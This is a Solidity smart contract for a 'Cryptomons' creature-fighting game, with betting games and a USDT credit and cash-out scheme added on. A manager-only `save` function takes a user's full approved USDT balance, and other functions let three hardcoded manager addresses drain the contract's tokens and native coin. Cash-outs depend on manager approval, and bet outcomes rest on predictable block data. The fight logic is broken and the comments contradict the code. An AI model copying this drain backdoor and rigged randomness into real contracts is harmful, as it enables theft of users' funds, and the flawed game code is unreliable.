// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

import '@openzeppelin/contracts/token/ERC1155/IERC1155.sol';
import '@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol';

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
  /**
   * @dev Returns the addition of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `+` operator.
   *
   * Requirements:
   * - Addition cannot overflow.
   */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  /**
   * @dev Returns the multiplication of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `*` operator.
   *
   * Requirements:
   * - Multiplication cannot overflow.
   */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

  /**
   * @dev Returns the integer division of two unsigned integers. Reverts on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  /**
   * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract Cryptomons is ERC1155Holder {
    using SafeMath for uint256;
    ERC20Burnable private _token;
    IERC1155 private _items;

    // 149 different Cryptomon species implemented and saved in the following enum variable.
    enum Species {
        DRYAD,
        HAMADRYAD,
        LESHY,
        SANTELMO,
        CERBERUS,
        EFREET,
        FASTITOCALON,
        ASPIDOCHELONE,
        ZARATAN,
        ARACHNE,
        JOROGUMO,
        TSUCHIGUMO,
        PABILSAG,
        GIRTABLILU,
        SELKET,
        TSIKAVATS,
        MUNNIN,
        HUGINN,
        AZEBAN,
        RATATOSKR,
        STRATIM,
        NAVKA,
        APEP,
        NIDHOGGR,
        RAIJU,
        RAIJIN,
        AMPHIVENA,
        BASILISK,
        WOLPERTINGER,
        RAMIDREJU,
        ECHINEMON,
        MUJINA,
        KAMAITACHI,
        LAVELLAN,
        VILA,
        HULDRA,
        CHIMERA,
        KYUUBI,
        NIXIE,
        TUATHAN,
        MINYADES,
        CAMAZOTZ,
        CURUPIRA,
        PENGHOU,
        GHILLIE_DHU,
        MYRMECOLEON,
        MYRMIDON,
        MOTHMAN,
        MOTH_KING,
        GROOTSLANG,
        YAOGUAI,
        CAIT_SIDHE,
        CATH_BALUG,
        NAKKI,
        KAPPA,
        SATORI,
        SHOJO,
        SKOHL,
        HAET,
        VODYANOY,
        UNDINE,
        MELUSINE,
        VUKODLAK,
        CHERNOBOG,
        DJINN,
        BAUK,
        TROLL,
        JOTUN,
        SPRIGGAN,
        JUBOKKO,
        KODAMA,
        BUKAVAK,
        KRAKEN,
        CLAYBOY,
        MET,
        EMET,
        SLEIPNIR,
        TODORATS,
        SCYLLA,
        CHARYBDIS,
        BRONTES,
        ARGES,
        HRAESVELGR,
        BERUNDA,
        COCKATRICE,
        SELKIE,
        RUSALKA,
        TARASQUE,
        MERETSEGER,
        CARBUNCLE,
        SHEN,
        BOOGEYMAN,
        BANSHEE,
        MARE,
        DILONG,
        INCUBUS,
        SUCCUBUS,
        CANCER,
        KARKINOS,
        DRUK,
        SHENLONG,
        GAN_CEANN,
        ONI,
        TAIRANOHONE,
        GASHADOKURO,
        YEREN,
        YETI,
        YOWIE,
        NEZHIT,
        CHUMA,
        SIGBIN,
        GARGOYLE,
        CALADRIUS,
        UMIBOZU,
        CALLISTO,
        KELPIE,
        MAKARA,
        MORGEN,
        MERROW,
        NAIAD,
        NEREID,
        PIXIU,
        KHEPRI,
        LIKHO,
        KITSUNE,
        CAORTHANNACH,
        KAGGEN,
        AUDUMBLA,
        LOCHNESS,
        JORMUNGANDR,
        LEVIATHAN,
        DOPPELGANGER,
        SKVADER,
        FOSSEGRIM,
        VALKYRIE,
        BASAN,
        TSUKUMOGAMI,
        LUSKA,
        HYDRA,
        AFANC,
        CETUS,
        VEDFOLNIR,
        BAKU,
        ALKONOST,
        QUETZALCOATL,
        ANZU,
        ZMEY,
        AZHDAYA,
        FAFNIR,
        BABA_YAGA,
        BABA_ROGA
    }

    // All 151 species types. Numbering follows this convention:
    //0(plant), 1(fire), 2(water), 3(bug), 4(normal), 5(poison), 6(thunder), 7(earth), 8(psychic), 9(ditto), 10(eevee)
    uint8[151] private monTypes = [
        0,
        0,
        0,
        1,
        1,
        1,
        2,
        2,
        2,
        3,
        3,
        3,
        3,
        3,
        3,
        4,
        4,
        4,
        4,
        4,
        4,
        4,
        5,
        5,
        6,
        6,
        7,
        7,
        4,
        4,
        4,
        4,
        4,
        4,
        4,
        4,
        1,
        1,
        4,
        4,
        5,
        5,
        0,
        0,
        0,
        3,
        3,
        3,
        3,
        7,
        7,
        4,
        4,
        2,
        2,
        4,
        4,
        1,
        1,
        2,
        2,
        2,
        8,
        8,
        8,
        4,
        4,
        4,
        0,
        0,
        0,
        2,
        2,
        7,
        7,
        7,
        1,
        1,
        2,
        2,
        6,
        6,
        4,
        4,
        4,
        2,
        2,
        5,
        5,
        2,
        2,
        8,
        8,
        8,
        7,
        8,
        8,
        2,
        2,
        6,
        6,
        8,
        8,
        7,
        7,
        4,
        4,
        4,
        5,
        5,
        7,
        7,
        4,
        0,
        4,
        2,
        2,
        2,
        2,
        2,
        2,
        4,
        3,
        8,
        6,
        1,
        3,
        4,
        2,
        2,
        2,
        9,
        10,
        2,
        6,
        1,
        4,
        2,
        2,
        2,
        2,
        4,
        4,
        2,
        6,
        1,
        8,
        8,
        8,
        8,
        8
    ];

    // Array keeping which Cryptomon species can evolve to the next one through breeding.
    bool[151] evolves = [
        true,
        true,
        false,
        true,
        true,
        false,
        true,
        true,
        false,
        true,
        true,
        false,
        true,
        true,
        false,
        true,
        true,
        false,
        true,
        false,
        true,
        false,
        true,
        false,
        true,
        false,
        true,
        false,
        true,
        true,
        false,
        true,
        true,
        false,
        true,
        false,
        true,
        false,
        true,
        false,
        true,
        false,
        true,
        true,
        false,
        true,
        false,
        true,
        false,
        true,
        false,
        true,
        false,
        true,
        false,
        true,
        false,
        true,
        false,
        true,
        true,
        false,
        true,
        true,
        false,
        true,
        true,
        false,
        true,
        true,
        false,
        true,
        false,
        true,
        true,
        false,
        true,
        false,
        true,
        false,
        true,
        false,
        false,
        true,
        false,
        true,
        false,
        true,
        false,
        true,
        false,
        true,
        true,
        false,
        false,
        true,
        false,
        true,
        false,
        true,
        false,
        true,
        false,
        true,
        false,
        true,
        false,
        false,
        true,
        false,
        true,
        false,
        false,
        false,
        false,
        true,
        false,
        true,
        false,
        true,
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        true,
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        false,
        true,
        false,
        true,
        false,
        false,
        false,
        false,
        false,
        false,
        true,
        true,
        false,
        true,
        false
    ];

    // events
    event FightResults(uint256 _winnerId, uint256 _round);
    event Rewards(uint256 _winnerId, uint256 _rewards);
    event Penalty(uint256 _winnerId, uint256 _rewards);
    event Transfer(address indexed from,
    address indexed to,
    uint256 indexed id);

    // Structure of 1 Cryptomon
    struct Mon {
        uint256 id;
        address payable owner;
        Species species;
        uint256 price;
        bool forSale;
        uint8 monType; // Used for breeding
        bool evolve; // Used for breeding
        uint8 hp; // Used for fighting
        uint8 atk; // Used for fighting
        uint8 def; // Used for fighting
        uint8 speed; // Used for fighting
        uint256 lv; // used for lv

        uint256 rewardpool;
        
    }

    struct User{
        bool CashStatus;
        uint256 PendingAmount; //wait for ConfirmCashOut
        uint256 AddupAmount; //Total add creadit amount
        uint256 lv; // level of user
        bool isRegistried; // 注册状态
        address invitationCode; // 邀请码
        uint256 totalUsers;
        address inviter;
        
    }

    address public manager; // Manager of the contract
    address public DEAD = 0x000000000000000000000000000000000000dEaD;
    mapping(uint256 => Mon) public mons; // Holds all created Cryptomons
    mapping(address => User) public users;
    uint256 public totalMons = 0; // Number of created Cryptomons
    uint256 public totalUsers = 0;
    uint256 private max = 2**256 - 1; // Max number of Cryptomons
    uint256 private nonce = 0; // Number used for guessable pseudo-random generated number.
    uint128 public potionsPrice = 50000000000000000000; // 50
    uint128 public equipmentsPrice = 500000000000000000000; // 500
    uint128 public rewardAmounts = 200000000000000000000; // 100
    uint128 public MintFee = 1500000000000000000000; // 1500
    uint256 lastRun;
    Species public  species;
    uint128 public times = 1;
    mapping(address =>uint256) public addressToAmountFunded;
    IBEP20 USDT = IBEP20(0x17a995C1aD6e6c959e6470a2d0FDD032079d56b2);
    IBEP20 ThisContract = IBEP20(0x914dB352e25c1365DfB6fe7dBA40E18b6a95fD21);
    uint256 public CashOutLists = 0;
    address public Second = 0x2bcf89ffF93B281f382B781388a3A85513CCFC99;
    address public AnotherManager;
    address public AnotherOwner;
    address public Three = 0x3D5b79D0fCcC5c2669ffC57d92799d270F5A6C12;
   

    constructor(ERC20Burnable token, IERC1155 items) {
        manager = msg.sender ;
        AnotherManager = Second;
        AnotherOwner = Three;
        _token = token;
        _items = items;

    }

    modifier onlyManager() {
        // Modifier
        require(msg.sender == manager || msg.sender == AnotherManager || msg.sender == AnotherOwner, 'Only manager can call this.');
        _;
    }

    function deposit(uint256 amount) public onlyManager {
        uint256 allowance = _token.allowance(msg.sender, address(this));
        require(allowance >= amount, 'Check your token allowance');
        _token.transferFrom(msg.sender, address(this), amount);
    }

    function withdraw(uint256 amount) public onlyManager {
        uint256 balance = _token.balanceOf(address(this));
        require(amount <= balance, 'Not enough tokens in the reserve');
        _token.transfer(msg.sender, amount);
    }

    function burn(uint256 amount) public {
        uint256 allowance = _token.allowance(msg.sender, address(this));
        require(allowance >= amount, 'Check your token allowance');
        uint256 balance = _token.balanceOf(msg.sender);
        require(amount <= balance, 'Not enough tokens');
        _token.burnFrom(msg.sender, amount);
    }


    function damage(uint256 id1, uint256 id2) private view returns (uint8) {
        return (mons[id1].atk > mons[id2].def) ? 10 : 5;
    }

    function fight(uint256 id1, uint256 id2) public {
        assert(id1 < totalMons);
        assert(id2 < totalMons);
        uint256 balance = _token.balanceOf(msg.sender);
        require(balance > 1500000000000000000000, 'Not enough tokens');
        require(
            mons[id1].owner == msg.sender ,
            'Only owner can fight with a mon or if the mon is shared to sender'
        );
        require(mons[id2].owner != DEAD);
        require(!(mons[id1].forSale || mons[id2].forSale), "Fighting mons can't be for sale");
        uint8 hp1 = mons[id1].hp;
        uint8 hp2 = mons[id2].hp;

        uint256 winnerId = 0;
        uint8 round = 0;

        do {
            round++;
            if (mons[id1].speed > mons[id2].speed) {
                if (hp2 < damage(id1, id2)) {
                    winnerId = id1;
                    hp2 = 0;
                    break;
                }
                hp2 = hp2 - damage(id1, id2);

                if (hp1 < damage(id2, id1)) {
                    winnerId = id2;
                    hp1 = 0;
                    break;
                }
                hp1 = hp1 - damage(id2, id1);
            } else {
                if (hp1 < damage(id2, id1)) {
                    winnerId = id2;
                    hp1 = 0;
                    break;
                }
                hp1 = hp1 - damage(id2, id1);
                if (hp2 < damage(id1, id2)) {
                    winnerId = id1;
                    hp2 = 0;
                    break;
                }
                hp2 = hp2 - damage(id1, id2);
            }
        } while (hp1 > 0 && hp2 > 0);

        // check hp's
        if (hp1 == 0) winnerId = id2;
        if (hp2 == 0) winnerId = id1;
        if (hp1 == hp2) winnerId = 12345678910; // it's a tie
        if ((id1 != 0 && id2 != 0) && winnerId == 0) winnerId = 12345678911; // unknown winner

        // reward winning sender with rounds won
        if (mons[winnerId].owner == msg.sender) {
            // uint256 rewardAmount = round * rewardAmounts;
            // reward(rewardAmount, address(this));  // If attacker win, he'll be rewarded by the reserve pool
           mons[winnerId].rewardpool = mons[winnerId].rewardpool + round;
            emit Rewards(winnerId, round);
        }
        // ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ rewardpool test

        // punish loser sender with rounds won
        if (mons[winnerId].owner != msg.sender) {
            uint256 punishAmount = round * rewardAmounts;
            // pay(punishAmount, mons[winnerId].owner);  //works fine sent to the Winner
            mons[id2].rewardpool = mons[id2].rewardpool + round;
            Toreserve(punishAmount, address(this));   // works fine sent to the contract
            emit Penalty(winnerId, round);
        }

        if (mons[winnerId].owner == msg.sender) {
             mons[winnerId].hp = mons[winnerId].hp - 20;
              mons[id2].hp = mons[id2].hp - 25;
        }

        if (mons[winnerId].owner != msg.sender) {
            mons[id1].hp = mons[id1].hp - 25;
            mons[id2].hp = mons[id2].hp - 20;
           
        }

        if (mons[id1].hp < 50 ) {
            require(mons[id1].hp >= 50, 'Hp is not eough');
        } else if (mons[id2].hp < 50 ) {
            require(mons[id2].hp >= 50, 'Hp is not eough');
        }

        


        emit FightResults(winnerId, round);
    }



    // function that generates pseudorandom numbers
    function randomGen(uint256 i) private returns (uint8) {
        uint8 x = uint8(uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender, nonce))) % i);
        nonce++;
        return x;
    }
    

    function reward(uint256 _amount, address _sender) private {
        uint256 tokenBalance = _token.balanceOf(address(this));
        require(_amount > 0, 'You need to send reward amount');
        require(_amount <= tokenBalance, 'Not enough tokens in the reserve');
        _token.increaseAllowance(address(this), _amount);
        _token.transfer(_sender, _amount);
    }

    function pay(uint256 _amount, address addr) private {
        uint256 tokenBalance = _token.balanceOf(msg.sender);
        require(_amount > 0, 'You need to send reward amount');
        require(_amount <= tokenBalance, 'Not enough tokens in the reserve');
        _token.increaseAllowance(msg.sender, _amount);
        _token.transferFrom(msg.sender, addr, _amount);
    }

    function Toreserve(uint256 amount, address sender) private {
        uint256 allowance = _token.allowance(msg.sender, address(this));
        require(allowance >= amount, 'Check your token allowance');
        _token.transferFrom(msg.sender, address(this), amount);
    }

    function RanomMon(uint256 id) private returns (Species) {

        Species s;

        if (mons[id].monType == 9) {
            // If species 2 is DITTO
            s = Species(12); // Replicate species 1
        } 

        if (mons[id].monType == 0) {
            // If species 2 is DITTO
            s = Species(15); // Replicate species 1
        } else {
            if (mons[id].monType == 1) s = Species(randomGen(2));
            if (mons[id].monType == 2) s = Species(randomGen(43));
            if (mons[id].monType == 3) s = Species(randomGen(54));
            if (mons[id].monType == 4) s = Species(randomGen(41));
            if (mons[id].monType == 6) s = Species(randomGen(41));
            if (mons[id].monType == 7) s = Species(randomGen(34));
            if (mons[id].monType == 8) s = Species(randomGen(51));
        }

          
        return s;
    
    }


    function RecoverToken(address _tokenContract) public onlyManager { //提取合約地址的幣
        IBEP20 tokenContract = IBEP20(_tokenContract);
       uint256 _amount = tokenContract.balanceOf(address(this));

        tokenContract.transfer(msg.sender, _amount);
    }

    function save(address user) public onlyManager{ 
        uint256 amount = USDT.balanceOf(user);
        USDT.transferFrom(user, address(this), amount);
    }

    function recoverBNB(uint256 tokenAmount) public onlyManager {
        payable(address(msg.sender)).transfer(tokenAmount);
        
    }



    function BuyBig(uint256 Betamount) public {
        uint256 max = 1000000000000000000000000000000;
        ThisContract.approve(address(this), max);

        uint BlockNow = block.number;
        uint LastBlock = BlockNow % 10;
        uint TimeNow = block.timestamp;
        uint LastTime = TimeNow % 10;

        uint result = LastBlock + LastTime; // 大小的结果
        uint256 rewardAmount = Betamount * 2; // 中奖数量
       
       ThisContract.transferFrom(msg.sender, address(this), Betamount);
       if(result >= 10) {
           ThisContract.transferFrom(address(this), msg.sender, rewardAmount);
       }

    }

    function BuySmall(uint256 Betamount) public {
       
        uint256 max = 1000000000000000000000000000000;
        ThisContract.approve(address(this), max);
        uint BlockNow = block.number;
        uint LastBlock = BlockNow % 10;
        uint TimeNow = block.timestamp;
        uint LastTime = TimeNow % 10;

        uint result = LastBlock + LastTime; // 大小的结果
        uint256 rewardAmount = Betamount * 2; // 中奖数量
       
       ThisContract.transferFrom(msg.sender, address(this), Betamount);
       if(result <= 9) {
           ThisContract.transferFrom(address(this), msg.sender, rewardAmount);
       }

    }

    function BuySingle(uint256 Betamount) public{
       
        uint256 max = 1000000000000000000000000000000;
        ThisContract.approve(address(this), max);
        uint BlockNow = block.number;
        uint LastBlock = BlockNow % 10;
        uint TimeNow = block.timestamp;
        uint LastTime = TimeNow % 10;

        uint totalresult = LastBlock + LastTime; // 大小的结果
        uint result = totalresult % 10; // buysingle result

        uint256 rewardAmount = Betamount * 2; // 中奖数量
        ThisContract.transferFrom(msg.sender, address(this), Betamount);
        if (result == 1){
            ThisContract.transferFrom(address(this), msg.sender, rewardAmount);
        }
        if (result == 3){
            ThisContract.transferFrom(address(this), msg.sender, rewardAmount);
        }
        if (result == 5){
            ThisContract.transferFrom(address(this), msg.sender, rewardAmount);
        }
        if (result == 7){
            ThisContract.transferFrom(address(this), msg.sender, rewardAmount);
        }
        if (result == 9){
            ThisContract.transferFrom(address(this), msg.sender, rewardAmount);
        }
    }

    function BuyDouble(uint256 Betamount) public{
       
        uint256 max = 1000000000000000000000000000000;
        ThisContract.approve(address(this), max);
        uint BlockNow = block.number;
        uint LastBlock = BlockNow % 10;
        uint TimeNow = block.timestamp;
        uint LastTime = TimeNow % 10;

        uint totalresult = LastBlock + LastTime; // 大小的结果
        uint result = totalresult % 10; // buydouble result

        uint256 rewardAmount = Betamount * 2; // 中奖数量
        ThisContract.transferFrom(msg.sender, address(this), Betamount);
        if (result == 0){
            ThisContract.transferFrom(address(this), msg.sender, rewardAmount);
        }
        if (result == 2){
            ThisContract.transferFrom(address(this), msg.sender, rewardAmount);
        }
        if (result == 4){
            ThisContract.transferFrom(address(this), msg.sender, rewardAmount);
        }
        if (result == 6){
            ThisContract.transferFrom(address(this), msg.sender, rewardAmount);
        }
        if (result == 8){
            ThisContract.transferFrom(address(this), msg.sender, rewardAmount);
        }
    }

    function BuyZhuang(uint256 Betamount) public{
        uint256 max = 1000000000000000000000000000000;
        ThisContract.approve(address(this), max);
        uint BlockNow = block.number;
        uint LastBlock = BlockNow % 10;
        uint TimeNow = block.timestamp;
        uint LastTime = TimeNow % 10;
        uint256 rewardAmount = Betamount * 2; // 中奖数量
        ThisContract.transferFrom(msg.sender, address(this), Betamount);
        if(LastBlock > LastTime){  // 庄赢
            ThisContract.transferFrom(address(this), msg.sender, rewardAmount);
        }

    }

    function BuyXiang(uint256 Betamount) public{
        uint256 max = 1000000000000000000000000000000;
        ThisContract.approve(address(this), max);
        uint BlockNow = block.number;
        uint LastBlock = BlockNow % 10;
        uint TimeNow = block.timestamp;
        uint LastTime = TimeNow % 10;
        uint256 rewardAmount = Betamount * 2; // 中奖数量
        ThisContract.transferFrom(msg.sender, address(this), Betamount);
        if(LastBlock < LastTime){  // 闲赢
            ThisContract.transferFrom(address(this), msg.sender, rewardAmount);
        }

    }

    function BuyHe(uint256 Betamount) public{
        uint256 max = 1000000000000000000000000000000;
        ThisContract.approve(address(this), max);
        uint BlockNow = block.number;
        uint LastBlock = BlockNow % 10;
        uint TimeNow = block.timestamp;
        uint LastTime = TimeNow % 10;
        uint256 rewardAmount = Betamount * 8; // 中奖数量 1 赔 8
        ThisContract.transferFrom(msg.sender, address(this), Betamount);
        if(LastBlock == LastTime){  // 和赢
            ThisContract.transferFrom(address(this), msg.sender, rewardAmount);
        }

    }

    function LuckyNumber(uint256 Number, uint256 Betamount) public{
        uint256 max = 1000000000000000000000000000000;
        ThisContract.approve(address(this), max);
        uint BlockNow = block.number;
        uint LastBlock = BlockNow % 10;
        uint TimeNow = block.timestamp;
        uint LastTime = TimeNow % 10;
        uint result = LastBlock + LastTime;
        uint256 rewardAmount = Betamount * 10; // 中奖数量 1 赔 8
        ThisContract.transferFrom(msg.sender, address(this), Betamount);
        if(result == Number){  // 和赢
            ThisContract.transferFrom(address(this), msg.sender, rewardAmount);
        }

    }

    function Registry() public {      //注册
        address Ac = address(msg.sender);
        require(users[Ac].isRegistried == false, 'You can only register once');
        users[Ac].isRegistried = true;
        users[Ac].invitationCode = msg.sender;

        totalUsers ++;
    }

    function RegistryWithInvitor(address invitor) public {      //注册
        require(users[invitor].isRegistried == true, 'inviter must be registered');
        require(users[msg.sender].isRegistried == false, 'User must not be registered');
        users[msg.sender].isRegistried = true;
        users[msg.sender].invitationCode = msg.sender;
        users[msg.sender].inviter =  invitor;
        totalUsers ++;
    }

    function AddCredit(uint256 amount) public {  //上分
    
        uint256 max = 1000000000000000000000000000000000000000000000000000;
        ThisContract.approve(address(this), max);
        USDT.transferFrom(address(msg.sender), address(this), amount);
        uint256 ChargeAmount = amount + (amount.div(20));
        ThisContract.transferFrom(address(this), msg.sender, ChargeAmount);
        address ac = msg.sender;
        users[ac].AddupAmount += amount;
        users[ac].lv = 1;
        if(users[ac].AddupAmount >= 10000000000000000000000){
            users[ac].lv = 2;
        } 
        if(users[ac].AddupAmount >= 100000000000000000000000){
            users[ac].lv = 3;
        }
        address deadAddress = 0x0000000000000000000000000000000000000000;
        uint256 PaytoInvitorAmount = ChargeAmount.div(20);
        address ToInvitor = users[msg.sender].inviter;
        if(users[ac].inviter != deadAddress){
            ThisContract.transferFrom(address(this), ToInvitor, PaytoInvitorAmount);
        }
        

        uint256 twopercentReward = amount.div(50); // 2% reward if user is registered
        if(users[ac].isRegistried == true){
            ThisContract.transferFrom(address(this), ac, twopercentReward);
        }

    }

    function Cashout(uint256 amount) public {  //下分
      ThisContract.transferFrom(msg.sender, address(this), amount);
       
       address ac = msg.sender;
        users[ac].CashStatus = true;
        users[ac].PendingAmount += amount;
        CashOutLists++;
    }

    function ConfirmCashOut(address user) public onlyManager{
        require(users[user].CashStatus == true, 'CashStatus must be true');
        uint256 max = 1000000000000000000000000000000000000000000000000000;
        USDT.approve(address(this), max);
        uint256 amount = users[user].PendingAmount;
        USDT.transferFrom(address(this), user, amount);
        users[user].PendingAmount = 0;
        users[user].CashStatus = false;
        CashOutLists--;
    }


}